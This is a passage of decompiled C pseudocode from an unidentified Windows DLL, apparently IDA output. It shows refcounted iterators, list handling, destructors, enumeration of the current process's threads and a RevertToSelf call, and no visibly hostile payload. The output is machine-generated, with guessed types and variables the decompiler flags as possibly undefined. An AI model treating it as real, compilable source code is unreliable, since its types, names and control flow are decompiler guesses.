  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v7[0] + 4))(v7[0]) )
  {
    if ( (*(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]) + 20) & a2) != 0 )
    {
      v4 = (*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]);
      sub_10023406(*(int **)(v4 + 12));
    }
    sub_10021F56(v3, v7[0]);
  }
  LOBYTE(v8) = 0;
  sub_10020B81(v7);
  v8 = -1;
  return sub_1000EDA4(v6);
}
// 10021815: variable 'v3' is possibly undefined

//----- (1002184E) --------------------------------------------------------
int *__stdcall sub_1002184E(int *a1, int *a2, int a3)
{
  int v3; // eax
  int *v4; // edi
  int v5; // eax
  _DWORD *v6; // eax
  int v7; // edi
  int v8; // ecx
  volatile LONG *v10; // [esp-4h] [ebp-40h]
  int v11[3]; // [esp+Ch] [ebp-30h] BYREF
  _DWORD *v12[2]; // [esp+18h] [ebp-24h] BYREF
  int v13; // [esp+20h] [ebp-1Ch] BYREF
  char v14[8]; // [esp+24h] [ebp-18h] BYREF
  int v15; // [esp+2Ch] [ebp-10h]
  int v16; // [esp+38h] [ebp-4h]
  _DWORD *v17; // [esp+44h] [ebp+8h]

  v16 = 0;
  v15 = 0;
  sub_1000EDE4(a1, v12);
  v16 = 1;
  sub_10050B91(a2, 0);
  v3 = a1[9];
  v15 = 1;
  v4 = (int *)(*(int (__thiscall **)(int *, char *))(v3 + 12))(a1 + 9, v14);
  LOBYTE(v16) = 2;
  if ( *a2 != *v4 )
  {
    sub_10040447((int)a2);
    a2[1] = v4[1];
    v10 = (volatile LONG *)a2[1];
    *a2 = *v4;
    InterlockedIncrement(v10);
  }
  LOBYTE(v16) = 1;
  sub_10020B81(v14);
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)*a2 + 4))(*a2) )
  {
    v5 = (*(int (__thiscall **)(int))(*(_DWORD *)*a2 + 12))(*a2);
    v17 = sub_1001CA9C(v5, v11);
    LOBYTE(v16) = 3;
    v6 = sub_1001CA9C(a3, &v13);
    LOBYTE(v16) = 4;
    v7 = sub_1001C78D(v6);
    HIBYTE(v17) = v7 == sub_1001C78D(v17);
    LOBYTE(v16) = 3;
    sub_100128CB(&v13);
    LOBYTE(v16) = 1;
    sub_100128CB(v11);
    if ( HIBYTE(v17) )
      break;
    sub_10021F56(v8, *a2);
  }
  LOBYTE(v16) = 0;
  sub_1000EDA4(v12);
  return a2;
}
// 10021928: variable 'v8' is possibly undefined
// 1002184E: using guessed type int var_30[3];

//----- (10021957) --------------------------------------------------------
int __usercall sub_10021957@<eax>(int a1@<ecx>, int *a2@<ebx>)
{
  int v3; // esi
  int v4; // esi
  _DWORD *v6[2]; // [esp+8h] [ebp-20h] BYREF
  int v7[3]; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+24h] [ebp-4h]

  sub_1000EDE4(a2, v6);
  v8 = 0;
  sub_1002184E(a2, v7, a1);
  LOBYTE(v8) = 1;
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v7[0] + 4))(v7[0]) )
  {
    (*(void (__thiscall **)(int *, int))(a2[9] + 36))(a2 + 9, a1);
  }
  else
  {
    v3 = *(_DWORD *)(a1 + 20);
    v4 = v3 | *(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]) + 20);
    *(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]) + 20) = v4;
  }
  LOBYTE(v8) = 0;
  sub_10020B81(v7);
  v8 = -1;
  return sub_1000EDA4(v6);
}

//----- (100219DF) --------------------------------------------------------
int __usercall sub_100219DF@<eax>(_DWORD *a1@<eax>, int a2@<esi>)
{
  *(_DWORD *)a2 = off_10102F00;
  *(_DWORD *)(a2 + 4) = *a1;
  sub_10023A8A();
  sub_100222EA();
  sub_100217C1((int *)dword_1017E0F4, *(_DWORD *)(a2 + 4));
  *(_BYTE *)(a2 + 8) = 1;
  return a2;
}
// 10102F00: using guessed type int (__thiscall *off_10102F00[3])(void *Block, char);
// 1017E0F4: using guessed type int dword_1017E0F4;

//----- (10021A18) --------------------------------------------------------
_DWORD *__thiscall sub_10021A18(_DWORD *Block, char a2)
{
  sub_10021A57(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10021A37) --------------------------------------------------------
int __usercall sub_10021A37@<eax>(int a1@<esi>)
{
  int result; // eax

  if ( *(_BYTE *)(a1 + 8) )
  {
    sub_100222EA();
    result = sub_10021714((int *)dword_1017E0F4, *(_DWORD *)(a1 + 4));
    *(_BYTE *)(a1 + 8) = 0;
  }
  return result;
}
// 1017E0F4: using guessed type int dword_1017E0F4;

//----- (10021A57) --------------------------------------------------------
int __thiscall sub_10021A57(_DWORD *this)
{
  _DWORD v2[8]; // [esp+0h] [ebp-20h] BYREF

  v2[4] = v2;
  *this = off_10102F00;
  v2[7] = 0;
  return sub_10021A37((int)this);
}
// 10102F00: using guessed type int (__thiscall *off_10102F00[3])(void *Block, char);

//----- (10021A97) --------------------------------------------------------
int *__thiscall sub_10021A97(void *this, int *a2, unsigned int a3)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  int v6; // ecx
  unsigned int v7; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a3 > v4 )
  {
    v5 = sub_1000E8EF(&a3);
    sub_100078FE((int)v5);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( a3 )
  {
    v7 = a3;
    do
    {
      sub_10021F56(v6, *a2);
      --v7;
    }
    while ( v7 );
  }
  return a2;
}
// 10021AF0: variable 'v6' is possibly undefined

//----- (10021B0B) --------------------------------------------------------
void __thiscall sub_10021B0B(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10020B81(v2);
}

//----- (10021B49) --------------------------------------------------------
void __thiscall sub_10021B49(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10020B81(v3);
}

//----- (10021B8A) --------------------------------------------------------
void __thiscall sub_10021B8A(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10020B81(v2);
}

//----- (10021BC8) --------------------------------------------------------
int __thiscall sub_10021BC8(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10020B81(v4);
  return v2;
}

//----- (10021C0C) --------------------------------------------------------
void __thiscall sub_10021C0C(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10020B81(v1);
}

//----- (10021C53) --------------------------------------------------------
void *__thiscall sub_10021C53(_DWORD *this)
{
  _DWORD *i; // eax
  _DWORD *v3; // edi
  _DWORD v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v5[4] = v5;
  v5[3] = this;
  *this = &off_10102EC0;
  v6 = 1;
  for ( i = (_DWORD *)this[1]; i; i = v3 )
  {
    v3 = (_DWORD *)i[6];
    sub_10021ECA(i);
  }
  v6 = -1;
  return sub_100185A9(this);
}
// 10102EC0: using guessed type int (__thiscall *off_10102EC0)(void *Block, char);

//----- (10021CB9) --------------------------------------------------------
void *__thiscall sub_10021CB9(void *this, int a2)
{
  sub_10021F96(a2, (int)this);
  return this;
}

//----- (10021CCE) --------------------------------------------------------
_DWORD *__thiscall sub_10021CCE(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10102F08;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10102F08: using guessed type int (__thiscall *off_10102F08)(void *Block, char);

//----- (10021D34) --------------------------------------------------------
_DWORD *__thiscall sub_10021D34(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10102F08;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10102F08: using guessed type int (__thiscall *off_10102F08)(void *Block, char);

//----- (10021D9A) --------------------------------------------------------
_DWORD *__thiscall sub_10021D9A(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_10102F08;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10102F08: using guessed type int (__thiscall *off_10102F08)(void *Block, char);

//----- (10021E00) --------------------------------------------------------
_DWORD *__thiscall sub_10021E00(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_10102F08;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10102F08: using guessed type int (__thiscall *off_10102F08)(void *Block, char);

//----- (10021E66) --------------------------------------------------------
int *__thiscall sub_10021E66(void *this)
{
  int *result; // eax
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  *(_DWORD *)this = off_10102F04;
  v2[6] = 0;
  result = (int *)*((_DWORD *)this + 1);
  if ( result )
    return sub_10021F19(*((int **)this + 1));
  return result;
}
// 10102F04: using guessed type int (__thiscall *off_10102F04[2])(void *Block, char);

//----- (10021EAB) --------------------------------------------------------
_DWORD *__thiscall sub_10021EAB(_DWORD *Block, char a2)
{
  sub_10021C53(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10021ECA) --------------------------------------------------------
void *__stdcall sub_10021ECA(void *Block)
{
  sub_100232D7((int)Block);
  j__free(Block);
  return Block;
}

//----- (10021EFA) --------------------------------------------------------
void *__thiscall sub_10021EFA(void *Block, char a2)
{
  sub_10021E66(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10021F19) --------------------------------------------------------
int *__stdcall sub_10021F19(int *Block)
{
  sub_10021C53(Block + 9);
  sub_1001ECA1(Block);
  j__free(Block);
  return Block;
}

//----- (10021F56) --------------------------------------------------------
int __usercall sub_10021F56@<eax>(int a1@<ecx>, int a2@<esi>)
{
  _DWORD *v2; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    v4[0] = 104;
    sub_100078FE((int)v2);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10021F96) --------------------------------------------------------
void __usercall sub_10021F96(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  void *v5[3]; // [esp+8h] [ebp-18h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, void **))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_10021F56(v4, (int)v5[0]);
  }
  v6 = -1;
  sub_1002228F(v5);
}
// 10021FE6: variable 'v4' is possibly undefined

//----- (10022016) --------------------------------------------------------
int __thiscall sub_10022016(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[3];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 24);
  this[3] = result;
  return result;
}

//----- (10022055) --------------------------------------------------------
int __thiscall sub_10022055(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 28);
  this[2] = result;
  return result;
}

//----- (10022094) --------------------------------------------------------
void *__thiscall sub_10022094(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  void *result; // eax
  _DWORD v9[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v9);
    v9[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 24);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 24) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 28) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  result = *(void **)(this + 12);
  if ( result )
    result = sub_10021ECA(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (1002211C) --------------------------------------------------------
_DWORD *__thiscall sub_1002211C(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[6]; // [esp-20h] [ebp-38h] BYREF
  int v7; // [esp-8h] [ebp-20h]
  int v8; // [esp-4h] [ebp-1Ch]
  int *v9; // [esp+4h] [ebp-14h]
  void *Block; // [esp+8h] [ebp-10h]
  int v11; // [esp+14h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x20u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_100221D2(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_10022247(Block, v6[0], v6[1], v6[2], v6[3], v6[4], v6[5], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 24) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 28) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (100221A9) --------------------------------------------------------
BOOL __thiscall sub_100221A9(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100221B2) --------------------------------------------------------
_DWORD *__thiscall sub_100221B2(_DWORD *Block, char a2)
{
  *Block = &off_10102F08;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10102F08: using guessed type int (__thiscall *off_10102F08)(void *Block, char);

//----- (100221D2) --------------------------------------------------------
_DWORD *__thiscall sub_100221D2(_DWORD *this, _DWORD *a2)
{
  volatile LONG *v4; // [esp-4h] [ebp-18h]

  sub_1001CA9C((int)this, a2);
  *a2 = &off_10102E70;
  a2[4] = this[4];
  v4 = (volatile LONG *)a2[4];
  a2[3] = this[3];
  InterlockedIncrement(v4);
  a2[5] = this[5];
  return a2;
}
// 10102E70: using guessed type int (__thiscall *off_10102E70)(void *Block, char);

//----- (10022228) --------------------------------------------------------
void *__thiscall sub_10022228(void *Block, char a2)
{
  sub_100232D7((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10022247) --------------------------------------------------------
_DWORD *__stdcall sub_10022247(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  sub_100221D2(&a2, a1);
  a1[6] = a8;
  a1[7] = a9;
  sub_100232D7((int)&a2);
  return a1;
}

//----- (1002228F) --------------------------------------------------------
void __thiscall sub_1002228F(void **this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  v2[6] = 0;
  if ( !InterlockedDecrement((volatile LONG *)this[1]) )
  {
    if ( this[1] )
      j__free(this[1]);
    if ( *this )
      (**(void (__thiscall ***)(void *, int))*this)(*this, 1);
  }
}

//----- (100222EA) --------------------------------------------------------
int sub_100222EA()
{
  int v0; // ecx
  int result; // eax
  _DWORD *v2; // eax
  int v3; // ecx
  _DWORD *v4[2]; // [esp+4h] [ebp-1Ch] BYREF
  void *Block[2]; // [esp+Ch] [ebp-14h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v0 = dword_1017E0F4;
  result = _InterlockedExchange((volatile __int32 *)Block, (__int32)&loc_100AB66E);
  if ( !v0 )
  {
    sub_1000EDE4(dword_10193C6C, v4);
    v6 = 0;
    if ( !dword_1017E0F4 )
    {
      v2 = operator new(0x34u);
      Block[0] = v2;
      LOBYTE(v6) = 1;
      if ( v2 )
      {
        v2 = sub_100216C6(v2);
        v3 = (int)v2;
      }
      else
      {
        v3 = 0;
      }
      LOBYTE(v6) = 0;
      _InterlockedExchange((volatile __int32 *)Block, (__int32)v2);
      dword_1017E0F4 = v3;
      dword_10183600 = v3;
    }
    v6 = -1;
    return sub_1000EDA4(v4);
  }
  return result;
}
// 1017E0F4: using guessed type int dword_1017E0F4;
// 10183600: using guessed type int dword_10183600;
// 10193C6C: using guessed type int dword_10193C6C[9];

//----- (1002236A) --------------------------------------------------------
_DWORD *__stdcall sub_1002236A(_DWORD *a1, int a2, int a3, LPCWSTR lpName)
{
  int v5[4]; // [esp+0h] [ebp-1Ch] BYREF
  int v6; // [esp+18h] [ebp-4h]

  v6 = 0;
  v5[3] = (int)v5;
  *a1 = &off_10102950;
  sub_1000D372(v5, (int)&a2);
  LOBYTE(v6) = 0;
  sub_1002052F((int)(a1 + 1), 4u, lpName, v5[0], v5[1]);
  v6 = -1;
  sub_1000D3AD(&a2);
  return a1;
}
// 10102950: using guessed type int (__thiscall *off_10102950)(void *Block, char);

//----- (100223C7) --------------------------------------------------------
_DWORD *__thiscall sub_100223C7(void *this, int a2)
{
  _DWORD *v2; // edx

  sub_100201A0(this, a2, 0);
  *v2 = &off_10102F28;
  return v2;
}
// 100223E0: variable 'v2' is possibly undefined
// 10102F28: using guessed type int (__thiscall *off_10102F28)(void *Block, char);

//----- (100223FA) --------------------------------------------------------
_BYTE *__thiscall sub_100223FA(_BYTE *Block, char a2)
{
  sub_10022419(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10022419) --------------------------------------------------------
void *__thiscall sub_10022419(_BYTE *this)
{
  *(_DWORD *)this = &off_10102F28;
  return sub_100201D0(this);
}
// 10102F28: using guessed type int (__thiscall *off_10102F28)(void *Block, char);

//----- (10022442) --------------------------------------------------------
void *__thiscall sub_10022442(void *this, int a2, unsigned int a3)
{
  void *result; // eax
  unsigned int i; // esi
  _DWORD *v6; // eax
  _DWORD v7[6]; // [esp+8h] [ebp-18h] BYREF

  result = &loc_100A55DB;
  for ( i = 0; i < a3; ++i )
  {
    result = (void *)(*(int (__thiscall **)(void *, unsigned int))(*(_DWORD *)this + 16))(this, i + a2);
    if ( !result )
    {
      v6 = sub_10011653(v7);
      v7[5] = 0;
      sub_100117C0((int)v6, 37);
    }
  }
  return result;
}

//----- (10022497) --------------------------------------------------------
__int16 __thiscall sub_10022497(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 64))(this, &v2, 2);
  return (__int16)v2;
}

//----- (100224AC) --------------------------------------------------------
int __thiscall sub_100224AC(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 64))(this, &v2, 4);
  return (int)v2;
}

//----- (100224C0) --------------------------------------------------------
_DWORD *__thiscall sub_100224C0(void *this, _DWORD *a2)
{
  int i; // eax
  _DWORD *v4; // eax
  int v6[5]; // [esp+8h] [ebp-3Ch] BYREF
  int v7[5]; // [esp+1Ch] [ebp-28h] BYREF
  int v8; // [esp+30h] [ebp-14h]
  char v9; // [esp+37h] [ebp-Dh] BYREF
  int v10; // [esp+40h] [ebp-4h]

  v8 = 0;
  sub_1000B1F3(0, (int)v7, 0);
  v10 = 1;
  for ( i = (*(int (__thiscall **)(void *, char *))(*(_DWORD *)this + 16))(this, &v9);
        v9;
        i = (*(int (__thiscall **)(void *, char *))(*(_DWORD *)this + 16))(this, &v9) )
  {
    if ( !i )
      break;
    v4 = (_DWORD *)sub_1000B1F3((void *)1, (int)v6, &v9);
    LOBYTE(v10) = 2;
    sub_1000B544(v4, (int)v7);
    LOBYTE(v10) = 1;
    sub_1000B3DF(v6);
  }
  sub_1000D2FA(a2, 0);
  v8 = 1;
  LOBYTE(v10) = 0;
  sub_1000B3DF(v7);
  return a2;
}
// 100224C0: using guessed type int var_28[5];
// 100224C0: using guessed type int var_3C[5];

//----- (1002256C) --------------------------------------------------------
_DWORD *__thiscall sub_1002256C(_DWORD *Block, char a2)
{
  *Block = &off_10102F6C;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10102F6C: using guessed type int (__thiscall *off_10102F6C)(void *Block, char);

//----- (1002258C) --------------------------------------------------------
bool __thiscall sub_1002258C(_DWORD *this)
{
  bool result; // al

  *this = &off_10102F80;
  result = sub_1000A159(this + 2);
  *this = &off_10102F6C;
  return result;
}
// 10102F6C: using guessed type int (__thiscall *off_10102F6C)(void *Block, char);
// 10102F80: using guessed type int (__thiscall *off_10102F80)(void *Block, char);

//----- (100225C6) --------------------------------------------------------
_DWORD *__thiscall sub_100225C6(_DWORD *Block, char a2)
{
  sub_1002258C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100225E5) --------------------------------------------------------
int __stdcall sub_100225E5(int a1, int a2)
{
  DWORD v2; // eax
  HANDLE Toolhelp32Snapshot; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  DWORD v7; // [esp-8h] [ebp-2Ch]
  void *v8; // [esp-8h] [ebp-2Ch]
  DWORD CurrentProcessId; // [esp-4h] [ebp-28h]
  DWORD v10; // [esp-4h] [ebp-28h]
  _DWORD v11[3]; // [esp+Ch] [ebp-18h] BYREF
  int v12; // [esp+20h] [ebp-4h]

  *(_DWORD *)a1 = &off_10102F6C;
  *(_DWORD *)(a1 + 4) = a2;
  v12 = 0;
  *(_DWORD *)a1 = &off_10102F80;
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10011AF4(a1 + 8, (void *)0xFFFFFFFF, 0, 0, v2, CurrentProcessId);
  LOBYTE(v12) = 1;
  *(_BYTE *)(a1 + 44) = 0;
  v10 = GetCurrentProcessId();
  v7 = GetCurrentProcessId();
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(4u, 0);
  sub_1000A198((HANDLE *)(a1 + 8), Toolhelp32Snapshot, 0, 0, v7, v10);
  if ( *(_DWORD *)(a1 + 12) == -1 )
  {
    v4 = sub_1000E9DF(v11, 1, 1);
    LOBYTE(v12) = 2;
    sub_1000A947(v4, 48);
  }
  memset((void *)(a1 + 16), 0, 0x1Cu);
  v8 = *(void **)(a1 + 12);
  *(_DWORD *)(a1 + 16) = 28;
  if ( Thread32First(v8, (LPTHREADENTRY32)(a1 + 16)) )
  {
    if ( *(_DWORD *)(a1 + 28) != *(_DWORD *)(a1 + 4) )
      sub_100226D8(a1);
  }
  else
  {
    *(_BYTE *)(a1 + 44) = 1;
    if ( GetLastError() != 18 )
    {
      v5 = sub_1000E9DF(v11, 1, 1);
      LOBYTE(v12) = 3;
      sub_1000A947(v5, 57);
    }
  }
  return a1;
}
// 10102F6C: using guessed type int (__thiscall *off_10102F6C)(void *Block, char);
// 10102F80: using guessed type int (__thiscall *off_10102F80)(void *Block, char);
// 100225E5: using guessed type _DWORD var_18[3];

//----- (100226D4) --------------------------------------------------------
char __thiscall sub_100226D4(_BYTE *this)
{
  return this[44];
}

//----- (100226D8) --------------------------------------------------------
DWORD __thiscall sub_100226D8(int this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // edi
  DWORD result; // eax
  _DWORD *v5; // eax
  void *v6; // [esp-8h] [ebp-30h]
  int v7[3]; // [esp+Ch] [ebp-1Ch] BYREF
  int v8; // [esp+18h] [ebp-10h] BYREF
  int v9; // [esp+24h] [ebp-4h]

  if ( *(_BYTE *)(this + 44) )
  {
    v2 = sub_1000E8EF(&v8);
    v9 = 0;
    sub_100078FE((int)v2);
  }
  v3 = (_DWORD *)(this + 16);
  while ( 1 )
  {
    memset((void *)(this + 16), 0, 0x1Cu);
    v6 = *(void **)(this + 12);
    *v3 = 28;
    result = Thread32Next(v6, (LPTHREADENTRY32)(this + 16));
    if ( !result )
      break;
    if ( !*(_BYTE *)(this + 44) )
    {
      result = *(_DWORD *)(this + 28);
      if ( result != *(_DWORD *)(this + 4) )
        continue;
    }
    return result;
  }
  *(_BYTE *)(this + 44) = 1;
  result = GetLastError();
  if ( result != 18 )
  {
    v5 = sub_1000E9DF(v7, 1, 1);
    v9 = 1;
    sub_1000A947(v5, 80);
  }
  return result;
}
// 100226D8: using guessed type int var_1C[3];

//----- (1002276B) --------------------------------------------------------
int __thiscall sub_1002276B(int this)
{
  _DWORD *v1; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  v3[0] = this;
  if ( *(_BYTE *)(this + 44) )
  {
    v1 = sub_1000E7F7(v3, 1, 0);
    v3[3] = 0;
    sub_10007882((int)v1);
  }
  return *(_DWORD *)(this + 24);
}

//----- (100227A3) --------------------------------------------------------
void __noreturn sub_100227A3()
{
  _DWORD *v0; // eax
  _DWORD v1[6]; // [esp+0h] [ebp-18h] BYREF

  v0 = sub_1000E9DF(v1, 1, 1);
  v1[5] = 0;
  sub_1000A947(v0, 17);
}
// 100227A3: using guessed type void __noreturn sub_100227A3();

//----- (100227C9) --------------------------------------------------------
_DWORD *__thiscall sub_100227C9(_DWORD *Block, char a2)
{
  sub_100227E8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100227E8) --------------------------------------------------------
BOOL __thiscall sub_100227E8(_DWORD *this)
{
  BOOL result; // eax
  _DWORD *v2; // eax
  int v3; // [esp+0h] [ebp-28h] BYREF
  _DWORD v4[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v5; // [esp+24h] [ebp-4h]

  v4[3] = &v3;
  *this = off_10102F94;
  v5 = 0;
  result = RevertToSelf();
  if ( !result )
  {
    v2 = sub_1000E9DF(v4, 1, 1);
    LOBYTE(v5) = 1;
    sub_1000A947(v2, 24);
  }
  return result;
}
// 10102F94: using guessed type int (__thiscall *off_10102F94[3])(void *Block, char);

//----- (10022844) --------------------------------------------------------
int *__thiscall sub_10022844(int *Block, char a2)
{
  sub_10022863(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10022863) --------------------------------------------------------
void __thiscall sub_10022863(int *this)
{
  *this = (int)off_10102F98;
  sub_1001FBA6((int)(this + 6));
  sub_100128CB(this + 3);
}
// 10102F98: using guessed type int (__thiscall *off_10102F98[2])(void *Block, char);

//----- (100228A0) --------------------------------------------------------
int __stdcall sub_100228A0(int a1)
{
  int result; // eax
  int *v2; // eax
  DWORD v3; // eax
  bool v4; // zf
  int v5; // [esp+0h] [ebp-4Ch] BYREF
